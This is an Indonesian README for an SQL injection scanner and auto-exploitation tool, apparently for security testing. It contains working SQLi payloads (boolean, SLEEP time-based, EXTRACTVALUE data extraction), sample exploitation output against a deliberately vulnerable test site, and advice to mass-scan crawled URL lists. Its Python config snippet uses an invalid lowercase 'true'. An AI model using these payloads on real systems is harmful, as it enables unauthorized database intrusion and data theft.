# SQLiPoCEngine: Mesin Pemindai & Eksploitasi SQLi Cerdas

`SQLiPoCEngine` adalah *tool* pemindai keamanan *multi-thread* canggih yang dirancang untuk menemukan, mengidentifikasi, dan secara otomatis mengeksploitasi kerentanan SQL Injection (SQLi) yang kompleks.

Tidak seperti *scanner* biasa yang hanya mencari error, *tool* ini berspesialisasi dalam menemukan kerentanan *Blind* (Boolean-based & Time-based) yang paling sulit ditemukan di berbagai vektor serangan, lalu secara otomatis membuktikan dampaknya (PoC) dengan mengekstraksi data.

## ⚠️ Peringatan Penting

**Tool ini dibuat murni untuk tujuan edukasi dan pengujian keamanan yang sah (authorized).**

  * **Jangan Pernah** gunakan *tool* ini pada sistem yang bukan milik Anda atau tanpa izin tertulis yang eksplisit.
  * *Bug bounty* adalah pengujian yang sah, tetapi pastikan Anda selalu mematuhi *scope* (ruang lingkup) program.
  * Penulis tidak bertanggung jawab atas penyalahgunaan *tool* ini atau kerusakan apa pun yang disebabkannya.

-----

## 🚀 Fitur Unggulan

  * **Pemindaian Multi-Vektor:** Tidak hanya URL, *tool* ini menguji:
      * Parameter GET
      * Parameter POST (Form-Data)
      * *Body* JSON (untuk API)
      * *HTTP Headers* (Cookie, User-Agent, Referer, dll.)
  * **Deteksi Multi-Konteks:** Secara otomatis menguji payload untuk konteks **String** (`'payload'`) dan **Numerik** (`123 payload`) untuk akurasi maksimum.
  * **Deteksi Cerdas (Fingerprinting):** Saat kerentanan *time-based* terdeteksi, *tool* ini akan **mengidentifikasi jenis database** (MySQL, MSSQL, PostgreSQL) dan secara cerdas **hanya** menggunakan payload yang relevan setelahnya.
  * **Eksploitasi Otomatis (PoC):** Setelah kerentanan terkonfirmasi, *tool* ini akan **otomatis** mencoba melakukan eksploitasi *Error-Based* untuk mengambil data sensitif seperti `user()`, `database()`, dan `version()`.
  * **Akurasi Sangat Tinggi:** Menggunakan **analisis diferensial (baseline)** untuk membandingkan respons *true*, *false*, dan *normal*. Ini hampir sepenuhnya menghilangkan *false positive*.
  * **Sangat Cepat & Skalabel:**
    1.  **Multi-Target:** Dirancang untuk memindai *daftar* target secara paralel.
    2.  **Multi-Thread:** Memindai *parameter* di dalam satu target secara paralel.
  * **Aman:** Menggunakan verifikasi SSL secara *default*.

-----

## ⚙️ Kebutuhan Sistem

  * Python 3.x
  * Library `requests`

Anda dapat menginstalnya menggunakan pip:

```bash
pip install requests
```

-----

## 📖 Cara Penggunaan

*Tool* ini tidak menggunakan *command-line argument* yang rumit. Alur kerjanya dirancang untuk profesional: Anda mengonfigurasi target Anda langsung di dalam *script*.

### Langkah 1: Salin Kode

Salin kode v6 final ke dalam file, misalnya `sqli_engine.py`.

### Langkah 2: Konfigurasi Target Anda

Buka file `sqli_engine.py` dan gulir ke bagian paling bawah (`if __name__ == "__main__":`). Anda akan melihat daftar bernama `TARGETS_TO_SCAN`.

Ini adalah satu-satunya tempat yang perlu Anda edit.

```python
# --- CONTOH PENGGUNAAN ---
if __name__ == "__main__":
    
    # Ini adalah simulasi output dari tool crawler (e.g., gospider, hakrawler)
    TARGETS_TO_SCAN = [
        # Target 1: GET Sederhana (Hanya string URL)
        "http://testphp.vulnweb.com/artists.php?artist=1", 
        
        # Target 2: GET Sederhana lainnya
        "http://testphp.vulnweb.com/listproducts.php?cat=1",
        
        # Target 3: Halaman untuk tes header
        "http://testphp.vulnweb.com/index.php",
        
        # Target 4: Konfigurasi Kustom untuk POST (Bentuk kamus/dictionary)
        {
            "url": "http://testphp.vulnweb.com/login.php",
            "method": "POST",
            "post_data": {"username": "test", "password": "123"}
        },

        # Target 5: Konfigurasi Kustom untuk API/JSON (Bentuk kamus/dictionary)
        {
            "url": "https://api.somesite.com/v1/user/update",
            "method": "POST",
            "json_data": {"id": 101, "username": "admin", "is_active": true},
            "headers": {"X-API-Key": "YOUR_API_KEY_HERE"} # Opsional
        }
    ]

    print(f"--- MEMULAI MESIN PEMINDAI v6 PADA {len(TARGETS_TO_SCAN)} TARGET ---")
    
    with ThreadPoolExecutor(max_workers=5) as executor: # Sesuaikan max_workers
        executor.map(scan_target, TARGETS_TO_SCAN)

    print("--- SEMUA PEMINDAIAN SELESAI ---")

```

  * **Untuk Target GET Sederhana:** Cukup tambahkan URL lengkap (termasuk parameter) sebagai *string*.
  * **Untuk Target POST/JSON:** Gunakan format *dictionary* (kamus) untuk menentukan `url`, `method`, `post_data` (untuk form), atau `json_data` (untuk API). Anda juga bisa menambahkan *custom header* jika perlu.

### Langkah 3: Jalankan Pemindai

Setelah Anda menyimpan konfigurasi target Anda, jalankan *script* dari terminal:

```bash
python sqli_engine.py
```

*Tool* ini akan secara otomatis memindai semua target dalam daftar Anda secara paralel dan mencetak laporannya langsung ke konsol saat selesai.

-----

## 📊 Contoh Hasil

Berikut adalah contoh output saat *tool* ini menemukan dan mengeksploitasi kerentanan:

```bash
--- MEMULAI MESIN PEMINDAI v6 PADA 3 TARGET ---
[*] Memindai http://testphp.vulnweb.com/artists.php?artist=1...
[INFO] Database terdeteksi pada http://testphp.vulnweb.com/artists.php?artist=1: mysql
[VULNERABLE] Boolean-Based (String) terdeteksi pada URL Param (GET): artist
[VULNERABLE] Time-Based (String) terdeteksi pada URL Param (GET): artist
[EXPLOITED] Data ditemukan pada URL Param (GET) - artist: root@localhost
[EXPLOITED] Data ditemukan pada URL Param (GET) - artist: acuart
[EXPLOITED] Data ditemukan pada URL Param (GET) - artist: 5.5.21
[*] Memindai http://testphp.vulnweb.com/listproducts.php?cat=1...
[INFO] Database terdeteksi pada http://testphp.vulnweb.com/listproducts.php?cat=1: mysql
[VULNERABLE] Boolean-Based (String) terdeteksi pada URL Param (GET): cat
[VULNERABLE] Time-Based (String) terdeteksi pada URL Param (GET): cat
[EXPLOITED] Data ditemukan pada URL Param (GET) - cat: root@localhost
...
(Laporan akan dicetak di bawah...)

============================================================
LAPORAN HASIL SCAN v6 - http://testphp.vulnweb.com/artists.php?artist=1
============================================================

--- [!] KERENTANAN DITEMUKAN ---

--- Vektor: URL Param (GET) - artist ---
  > Tipe    : Boolean-Based (String)
  > Payload : ' AND '1'='1'--
  > Tipe    : Time-Based (String)
  > Payload : ' AND SLEEP(3)--

--- [!!!] DATA BERHASIL DIEKSPLOITASI ---

--- Vektor: URL Param (GET) - artist ---
  > DATA    : root@localhost
  > Payload : ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT USER())))--
  > DATA    : acuart
  > Payload : ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))--
  > DATA    : 5.5.21
  > Payload : ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION())))--

============================================================
... (Laporan untuk target lain) ...
--- SEMUA PEMINDAIAN SELESAI ---
```

-----

## 💡 Bagaimana Cara Kerjanya

1.  **Baseline:** *Tool* mengirim permintaan normal untuk mengukur panjang konten dan waktu respons.
2.  **Boolean-Based:** *Tool* mengirim payload `... AND 1=1` (true) dan `... AND 1=2` (false). Jika respons *true* cocok dengan *baseline* dan respons *false* **berbeda**, kerentanan ditemukan.
3.  **Time-Based:** *Tool* mengirim payload `... AND SLEEP(3)`. Jika waktu respons secara signifikan lebih lama dari `baseline + 3 detik`, kerentanan ditemukan.
4.  **Fingerprint:** Saat *time-based* berhasil, *tool* mencatat DBMS (`mysql`, `mssql`, `postgresql`) berdasarkan payload yang berhasil.
5.  **Exploit (PoC):** *Tool* menggunakan payload *error-based* (`EXTRACTVALUE`, dll.) yang sesuai dengan DBMS yang terdeteksi untuk mengambil data dan membuktikan dampaknya.

## ⛔ Batasan

  * **Bukan Crawler:** *Tool* ini adalah **pemindai presisi**, bukan *crawler*. Ini adalah pilihan desain. Alur kerja terbaik adalah menggunakan *tool* lain (seperti `gospider` atau `hakrawler`) untuk menemukan 1000 URL, lalu memasukkan URL tersebut ke dalam `TARGETS_TO_SCAN` *tool* ini.
  * **Eksploitasi Terbatas:** *Tool* ini hanya melakukan eksploitasi *Error-Based* untuk PoC cepat. Ia **tidak** melakukan eksploitasi *Blind-Based* (mengambil data huruf demi huruf), yang merupakan proses sangat lambat yang lebih baik ditangani oleh *tool* seperti `sqlmap`.